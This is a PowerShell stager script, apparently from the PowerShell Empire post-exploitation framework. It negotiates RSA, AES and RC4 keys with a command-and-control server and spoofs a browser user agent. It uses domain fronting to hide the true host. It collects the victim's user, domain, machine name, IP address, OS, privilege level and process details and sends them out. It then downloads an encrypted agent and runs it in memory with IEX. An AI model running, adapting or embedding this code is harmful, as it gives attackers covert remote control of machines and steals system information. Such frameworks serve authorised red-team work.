function Start-Negotiate {
    param($s,$SK,$UA='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko')
    
    function ConvertTo-RC4ByteStream {
        Param ($RCK, $In)
        begin {
            [Byte[]] $Str = 0..255;
            $J = 0;
            0..255 | ForEach-Object {
                $J = ($J + $Str[$_] + $RCK[$_ % $RCK.Length]) % 256;
                $Str[$_], $Str[$J] = $Str[$J], $Str[$_];
            };
            $I = $J = 0;
        }
        process {
            ForEach($Byte in $In) {
                $I = ($I + 1) % 256;
                $J = ($J + $Str[$I]) % 256;
                $Str[$I], $Str[$J] = $Str[$J], $Str[$I];
                $Byte -bxor $Str[($Str[$I] + $Str[$J]) % 256];
            }
        }
    }

    function Decrypt-Bytes {
        param ($Key, $In)
        if($In.Length -gt 32) {
            $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
            $e=[System.Text.Encoding]::ASCII;
            # Verify the HMAC
            $Mac = $In[-10..-1];
            $In = $In[0..($In.length - 11)];
            $hmac.Key = $e.GetBytes($Key);
            $Expected = $hmac.ComputeHash($In)[0..9];
            if (@(Compare-Object $Mac $Expected -Sync 0).Length -ne 0) {
                return;
            }

            # extract the IV
            $IV = $In[0..15];
           try {
                $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            }
            catch {
                $AES=New-Object System.Security.Cryptography.RijndaelManaged;
            }
            $AES.Mode = "CBC";
            $AES.Key = $e.GetBytes($Key);
            $AES.IV = $IV;
            ($AES.CreateDecryptor()).TransformFinalBlock(($In[16..$In.length]), 0, $In.Length-16)
        }
    }

    # make sure the appropriate assemblies are loaded
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Security");
    $Null = [Reflection.Assembly]::LoadWithPartialName("System.Core");

    # try to ignore all errors
    $ErrorActionPreference = "SilentlyContinue";
    $e=[System.Text.Encoding]::ASCII;
    $customHeaders = "";
    $SKB=$e.GetBytes($SK);
    # set up the AES/HMAC crypto
    # $SK -> staging key for this server
    try {
        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    }
    catch {
        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
    }
    
    $IV = [byte] 0..255 | Get-Random -count 16;
    $AES.Mode="CBC";
    $AES.Key=$SKB;
    $AES.IV = $IV;

    $hmac = New-Object System.Security.Cryptography.HMACSHA256;
    $hmac.Key = $SKB;

    $csp = New-Object System.Security.Cryptography.CspParameters;
    $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048,$csp;
    # export the public key in the only format possible...stupid
    $rk=$rs.ToXmlString($False);

    # generate a randomized sessionID of 8 characters
    $ID=-join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 8);

    # build the packet of (xml_key)
    $ib=$e.getbytes($rk);

    # encrypt/HMAC the packet for the c2 server
    $eb=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib,0,$ib.Length);
    $eb=$eb+$hmac.ComputeHash($eb)[0..9];

    # if the web client doesn't exist, create a new web client and set appropriate options
    #   this only happens if this stager.ps1 code is NOT called from a launcher context
    if(-not $wc) {
        $wc=New-Object System.Net.WebClient;
        # set the proxy settings for the WC to be the default system settings
        $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
    }

    if ($Script:Proxy) {
        $wc.Proxy = $Script:Proxy;   
    }

    
    # the User-Agent always resets for multiple calls...silly
    if ($customHeaders -ne "") {
        $headers = $customHeaders -split ',';
        $headers | ForEach-Object {
            $headerKey = $_.split(':')[0];
            $headerValue = $_.split(':')[1];
	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
	    if ($headerKey -eq "host"){
                try{$ig=$WC.DownloadData($s)}catch{}};
            $wc.Headers.Add($headerKey, $headerValue);
        }
    }
    $wc.Headers.Add("User-Agent",$UA);
    
    # RC4 routing packet:
    #   sessionID = $ID
    #   language = POWERSHELL (1)
    #   meta = STAGE1 (2)
    #   extra = (0x00, 0x00)
    #   length = len($eb)
    $IV=[BitConverter]::GetBytes($(Get-Random));
    $data = $e.getbytes($ID) + @(0x01,0x02,0x00,0x00) + [BitConverter]::GetBytes($eb.Length);
    $rc4p = ConvertTo-RC4ByteStream -RCK $($IV+$SKB) -In $data;
    $rc4p = $IV + $rc4p + $eb;

    # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
    $raw=$wc.UploadData($s+"/index.jsp","POST",$rc4p);

    # step 4 of negotiation -> server returns RSA(nonce+AESsession))
    $de=$e.GetString($rs.decrypt($raw,$false));

    # packet = server nonce + AES session key
    $nonce=$de[0..15] -join '';
    $key=$de[16..$de.length] -join '';

    # increment the nonce
    $nonce=[String]([long]$nonce + 1);

    # create a new AES object
    try {
        $AES=New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    }
    catch {
        $AES=New-Object System.Security.Cryptography.RijndaelManaged;
    }
    $IV = [byte] 0..255 | Get-Random -Count 16;
    $AES.Mode="CBC";
    $AES.Key=$e.GetBytes($key);
    $AES.IV = $IV;

    # get some basic system information
    $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;

    try{
        $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
    }
    catch {
        $p = "[FAILED]"
    }
   

    # check if the IP is a string or the [IPv4,IPv6] array
    $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
    if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
    $i+="|$ip";

    try{
        $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
    }
    catch{
        $i+='|'+'[FAILED]'
    }

    # detect if we're SYSTEM or otherwise high-integrity
    if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}
    else {$i += '|' +([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")}

    # get the current process name and ID
    $n=[System.Diagnostics.Process]::GetCurrentProcess();
    $i+='|'+$n.ProcessName+'|'+$n.Id;
    # get the powershell.exe version
    $i += "|powershell|" + $PSVersionTable.PSVersion.Major;

    # send back the initial system information
    $ib2=$e.getbytes($i);
    $eb2=$IV+$AES.CreateEncryptor().TransformFinalBlock($ib2,0,$ib2.Length);
    $hmac.Key = $e.GetBytes($key);
    $eb2 = $eb2+$hmac.ComputeHash($eb2)[0..9];

    # RC4 routing packet:
    #   sessionID = $ID
    #   language = POWERSHELL (1)
    #   meta = STAGE2 (3)
    #   extra = (0x00, 0x00)
    #   length = len($eb)
    $IV2=[BitConverter]::GetBytes($(Get-Random));
    $data2 = $e.getbytes($ID) + @(0x01,0x03,0x00,0x00) + [BitConverter]::GetBytes($eb2.Length);
    $rc4p2 = ConvertTo-RC4ByteStream -RCK $($IV2+$SKB) -In $data2;
    $rc4p2 = $IV2 + $rc4p2 + $eb2;

    # the User-Agent always resets for multiple calls...silly
    if ($customHeaders -ne "") {
        $headers = $customHeaders -split ',';
        $headers | ForEach-Object {
            $headerKey = $_.split(':')[0];
            $headerValue = $_.split(':')[1];
	    #If host header defined, assume domain fronting is in use and add a call to the base URL first
	    #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
	    if ($headerKey -eq "host"){
                try{$ig=$WC.DownloadData($s)}catch{}};
            $wc.Headers.Add($headerKey, $headerValue);
        }
    }
    $wc.Headers.Add("User-Agent",$UA);

    # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
    $raw=$wc.UploadData($s+"/index.php","POST",$rc4p2);

    # # decrypt the agent and register the agent logic
    # $data = $e.GetString($(Decrypt-Bytes -Key $key -In $raw));
    # write-host "data len: $($Data.Length)";
    IEX $( $e.GetString($(Decrypt-Bytes -Key $key -In $raw)) );

    # clear some variables out of memory and cleanup before execution
    $AES=$null;$s2=$null;$wc=$null;$eb2=$null;$raw=$null;$IV=$null;$wc=$null;$i=$null;$ib2=$null;
    [GC]::Collect();

    # TODO: remove this shitty $server logic
    Invoke-Empire -Servers @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "WORKING_HOURS_REPLACE" -KillDate "REPLACE_KILLDATE" -ProxySettings $Script:Proxy;
}
# $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
Start-Negotiate -s "$ser" -SK 'REPLACE_STAGING_KEY' -UA $u;
